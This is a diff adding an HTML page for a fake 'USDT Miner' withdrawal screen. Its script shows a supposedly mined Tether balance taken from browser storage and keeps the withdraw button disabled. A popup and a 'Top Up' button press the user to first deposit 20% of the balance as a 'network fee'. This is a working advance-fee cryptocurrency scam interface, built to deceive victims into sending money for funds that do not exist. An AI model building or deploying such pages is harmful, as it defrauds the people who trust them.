@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <script src="https://kit.fontawesome.com/32bbba991c.js" crossorigin="anonymous"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400&family=Quicksand:wght@500&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+    <title>USDT Miner</title>
+    <style>
+        * {
+            margin: 0 auto;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+            font-family: 'Quicksand', sans-serif;
+            font-size: 14px;
+        }
+        .container {
+            max-width: 500px;
+        }
+        .head {
+            text-align: center;
+        }
+        #logo {
+            width: 40px;
+            margin: 20px;
+        }
+        .action b {
+            font-size: 24px;
+        }
+        .action h3 {
+            text-align: center;
+        }
+        .action hr {
+            margin: 20px;
+        }
+        .d {
+            background-color: #e8e8e8;
+            padding: 10px;
+            margin: 10px;
+            border-radius: 10px;
+        }
+        span {
+            float: right;
+        }
+        .d h3 {
+            margin-bottom: 10px;
+            margin-top: 10px;
+        }
+        .wi {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            text-align: center;
+            width: 80%;
+        }
+        .wi button {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 10px;
+            padding: 10px;
+            border-style: dotted;
+            outline: none;
+            background-color: #fff;
+            cursor: pointer;
+            font-size: 16px;
+            color: #49b5ab;
+        }
+        #usdtInput {
+            font-size: 12px;
+        }
+        #status {
+            color: red;
+        }
+        .fa-circle-exclamation {
+            color: red;
+        }
+        .d button {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 10px;
+            padding: 10px;
+            border-style: dotted;
+            outline: none;
+            background-color: #fff;
+            cursor: pointer;
+            font-size: 16px;
+            color: #49b5ab;
+        }
+        .d button:hover {
+            background-color: #49b5ab;
+            color: #fff;
+            transition: background-color 0.3s ease;
+        }
+        .ddd {
+            margin-top: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="head">
+            <h3>Tether</h3>
+            <p>USDT | Trc20</p>
+        </div>
+        <div class="action">
+            <center>
+                <img id="logo" src="https://coinhere.io/wp-content/uploads/2020/08/Tether-USDT-icon-1.png" alt="" srcset="">
+            </center>
+            <h3><b id="balance"></b>USDT</h3>
+            <p style="font-size: medium; text-align: center;">≈ $<b style="font-size: medium; text-align: center;" id="balance"></b></p>
+            <hr>
+        </div>
+        <div class="d">
+            <h3>Amount <span id="balance"></span></h3>
+            <h3>Date <span id="currentdate&time"></span></h3>
+            <h3>Status <span id="status">Pending</span></h3>
+            <h3>Recipient <span id="usdtInput"></span></h3>
+        </div>
+        <div class="d">
+            <h3>Network fee <i onclick="showToggle()" class="fas fa-circle-exclamation"></i> <span>USDT ($30.00)</span></h3>
+        </div>
+        <div class="d">
+            <p>You don't have enough USDT (Trc20) to cover network fees.</p>
+            <div class="ddd">
+                <button onclick="location.href ='2deposit.html'">Top Up USDT (TRC)</button>
+            </div>
+        </div>
+        <div class="wi">
+            <button disabled="true">Confirm Withdrawal</button>
+        </div>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const savedBalance = localStorage.getItem('minedBalance');
+            if (savedBalance) {
+                const balanceElements = document.querySelectorAll('#balance');
+                balanceElements.forEach(element => {
+                    element.innerText = savedBalance;
+                });
+            }
+            const currentDateAndTimeElement = document.getElementById('currentdate&time');
+            if (currentDateAndTimeElement) {
+                const currentDateTime = new Date().toLocaleString();
+                currentDateAndTimeElement.innerText = currentDateTime;
+            }
+            const savedUsdtInput = localStorage.getItem('usdtAddress');
+            if (savedUsdtInput) {
+                const usdtInputElements = document.querySelectorAll('#usdtInput');
+                usdtInputElements.forEach(element => {
+                    element.innerText = savedUsdtInput;
+                });
+            }
+        });
+        function showToggle() {
+            const networkFeeMessage = "USDT TRC20 uses network fee, so go to the home page, click on deposit, deposit 20% of your correct balance worth of USDT to your wallet, and come back to withdraw your USDT.";
+            Swal.fire({
+                title: 'Network Fee Information',
+                text: networkFeeMessage,
+                icon: 'info',
+                confirmButtonText: 'Got it!',
+                iconColor: '#49b5ab',
+                confirmButtonColor: '#49b5ab'
+            });
+        }
+    </script>
+</body>
+
+</html>
